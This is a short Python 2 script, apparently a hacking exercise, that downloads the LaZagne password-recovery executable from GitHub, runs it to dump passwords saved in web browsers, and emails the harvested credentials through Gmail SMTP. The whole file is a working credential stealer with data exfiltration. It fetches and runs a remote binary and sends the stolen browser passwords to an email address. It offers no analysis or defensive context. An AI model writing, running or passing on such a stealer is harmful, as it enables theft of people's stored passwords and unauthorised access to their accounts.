
import requests,os, subprocess,smtplib

def send_email(SENDER_EMAIL,PASSWORD,TO,SUBJECT,MESSAGE):
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(SENDER_EMAIL,PASSWORD)
        message = """From: %s\nTo: %s\nSubject: %s\n\n%s""" % (SENDER_EMAIL, ", ".join(TO), SUBJECT, MESSAGE)
        server.sendmail(SENDER_EMAIL,TO,message)
        server.quit()
        print 'successfully sent the mail'
    except:
        print "failed to send mail"

def download(url):
    get_response = requests.get(url,stream=True)
    file_name  = url.split("/")[-1]
    with open(file_name, 'wb') as f:
        for chunk in get_response.iter_content(chunk_size=1024):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                f.flush()
                os.fsync(f.fileno())

download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe")
result_for_message = subprocess.check_output("laZagne browsers",shell=True)
# email-arguments: from,pass,to,subject,msg
send_email("emailq@gmail.com","password","email@gmail.com","CHECKING SMTP_SSL",result_for_message)
